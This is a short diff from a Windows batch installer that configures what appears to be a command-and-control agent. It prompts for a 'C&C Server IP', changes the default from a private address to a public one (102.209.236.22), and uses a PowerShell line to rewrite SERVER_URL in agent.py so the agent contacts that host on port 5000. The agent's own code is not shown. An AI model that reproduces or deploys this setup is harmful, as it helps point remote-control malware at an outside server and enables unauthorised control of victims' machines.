@@ -57,8 +57,8 @@ echo [OK] Dependencies installed
 
 REM Configure agent
 echo [4/5] Configuring agent...
-set /p SERVER_IP=Enter C&C Server IP (default: 192.168.100.253): 
-if "%SERVER_IP%"=="" set SERVER_IP=192.168.100.253
+set /p SERVER_IP=Enter C&C Server IP (default: 102.209.236.22): 
+if "%SERVER_IP%"=="" set SERVER_IP=102.209.236.22
 
 REM Update configuration in agent.py
 powershell -Command "(Get-Content agent.py) -replace 'SERVER_URL = \".*\"', 'SERVER_URL = \"http://%SERVER_IP%:5000\"' | Set-Content agent.py"
